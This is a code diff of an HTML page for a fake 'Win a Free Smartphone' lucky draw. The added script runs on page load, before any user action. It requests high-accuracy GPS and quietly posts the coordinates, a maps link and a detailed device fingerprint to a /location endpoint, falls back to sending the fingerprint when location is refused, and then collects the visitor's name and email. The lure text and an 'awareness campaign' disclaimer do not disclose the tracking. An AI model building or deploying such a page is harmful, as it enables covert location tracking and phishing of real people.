@@ -2,115 +2,244 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Exclusive Mobile Giveaway - Purple Promo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mega Lucky Draw</title>
   <style>
     body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
       margin: 0;
       padding: 0;
-      background: #f2f2f2;
-      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .container {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 500px;
+      padding: 30px;
+      text-align: center;
+    }
+    
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+    
+    h1 {
+      color: #6a0dad;
+      margin-bottom: 10px;
+    }
+    
+    .subtitle {
+      color: #666;
+      margin-bottom: 30px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
       color: #333;
     }
-
-    .container {
-      max-width: 700px;
-      margin: 40px auto;
-      padding: 20px;
-      background: #fff;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      border-radius: 10px;
-    }
-
-    h1 {
-      color: #6200ea;
-      text-align: center;
-    }
-
-    .promo-image {
+    
+    input {
       width: 100%;
-      height: auto;
+      padding: 12px 15px;
+      border: 1px solid #ddd;
       border-radius: 8px;
-    }
-
-    .details {
-      text-align: center;
-      margin-top: 20px;
-    }
-
-    .details p {
-      font-size: 18px;
-    }
-
-    .cta-button {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 12px 25px;
       font-size: 16px;
-      color: #fff;
-      background: #6200ea;
-      text-decoration: none;
-      border-radius: 6px;
-      transition: background 0.3s;
+      box-sizing: border-box;
     }
-
-    .cta-button:hover {
-      background: #4b00b5;
+    
+    button {
+      background: linear-gradient(135deg, #6a0dad, #9c27b0);
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+      font-weight: 500;
     }
-
-    .footer {
-      margin-top: 40px;
-      text-align: center;
-      font-size: 13px;
+    
+    .disclaimer {
+      font-size: 12px;
       color: #888;
+      margin-top: 30px;
+      line-height: 1.5;
+    }
+    
+    .success-message {
+      display: none;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    .success-icon {
+      font-size: 60px;
+      color: #4CAF50;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎉 Exclusive Mobile Giveaway 🎉</h1>
-    <img class="promo-image" src="https://i.imgur.com/U4C2G8x.png" alt="Phone Giveaway">
-    <div class="details">
-      <p>You're selected to receive a brand new <strong>Android flagship smartphone</strong>!</p>
-      <p>Answer one quick question and claim your reward.</p>
-      <a href="#" class="cta-button">Start Now</a>
+    <img src="https://www.shutterstock.com/shutterstock/photos/2516854283/display_1500/stock-vector-mega-lucky-draw-d-style-effect-retro-vintage-elegant-text-effect-with-red-and-gold-background-2516854283.jpg" alt="Win a Smartphone" class="logo">
+    
+    <div id="form-section">
+      <h1>Win a Free Smartphone!</h1>
+      <p class="subtitle">🎉 100 Lucky Winners will receive a brand-new mobile phone!</p>
+      
+      <div class="form-group">
+        <label for="name">Your First Name</label>
+        <input type="text" id="name" placeholder="e.g., John">
+      </div>
+      
+      <div class="form-group">
+        <label for="email">Your Email Address</label>
+        <input type="email" id="email" placeholder="e.g., john@example.com">
+      </div>
+      
+      <button onclick="submitForm()">Enter Contest</button>
+      
+      <p class="disclaimer">
+        Winners will be selected randomly and notified via email.  
+        This is part of an awareness campaign to educate users on online privacy.
+      </p>
     </div>
-    <div class="footer">
-      © 2025 Purple Promo Inc. | Terms Apply
+
+    <div id="success-section" class="success-message">
+      <div class="success-icon">✓</div>
+      <h1>Thank You!</h1>
+      <p>Your participation has been recorded.</p>
+      <p>We’ll contact you by email if you’re one of the winners.</p>
+      
     </div>
   </div>
 
-  <!-- 🔒 Hidden Location Tracker -->
+
   <script>
-    function sendLocation(position) {
-      fetch("/location", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          acc: position.coords.accuracy
-        })
-      });
+document.addEventListener("DOMContentLoaded", () => {
+  const nameInput = document.getElementById("name");
+  const emailInput = document.getElementById("email");
+  const submitButton = document.querySelector("button");
+  const formSection = document.getElementById("form-section");
+  const successSection = document.getElementById("success-section");
+
+  const user_info = { name: '', email: '' };
+  const timestamp = new Date().toISOString();
+
+  const deviceData = {
+    deviceType: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+    os: navigator.platform || 'Unknown',
+    browser: detectBrowser(navigator.userAgent),
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language,
+    platform: navigator.platform,
+    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+    memory: navigator.deviceMemory || 'Unknown',
+    userAgent: navigator.userAgent
+  };
+
+  // Immediately send device info and try GPS
+  sendWithLocation();
+
+  // Wait for user interaction to submit name/email
+  window.submitForm = function () {
+    const nameVal = nameInput?.value.trim();
+    const emailVal = emailInput?.value.trim();
+
+    if (!nameVal || !emailVal) {
+      alert("Please enter both name and email to participate.");
+      return;
     }
 
-    function fallbackIP() {
-      fetch("/location", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({gps_denied: true})
+    user_info.name = nameVal;
+    user_info.email = emailVal;
+
+    sendToServer("user_info", {
+      user_info,
+      timestamp
+    });
+
+    // Show success section only after user submits
+    formSection.style.display = "none";
+    successSection.style.display = "block";
+  };
+
+  function sendWithLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+
+          sendToServer("gps", {
+            lat,
+            lon,
+            acc,
+            maps_url: `https://www.google.com/maps?q=${lat},${lon}`,
+            device_info: deviceData,
+            timestamp
+          });
+        },
+        () => {
+          sendToServer("ip", {
+            device_info: deviceData,
+            timestamp
+          });
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    } else {
+      sendToServer("ip", {
+        device_info: deviceData,
+        timestamp
       });
     }
+  }
 
-    try {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, fallbackIP, {enableHighAccuracy: true});
-      } else {
-        fallbackIP();
-      }
-    } catch (e) {
-      fallbackIP();
-    }
-  </script>
+  function sendToServer(type, data) {
+    const payload = { type, ...data };
+
+    fetch('/location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(console.error);
+  }
+
+  function detectBrowser(ua) {
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+});
+</script>
+
+
+  
 </body>
 </html>
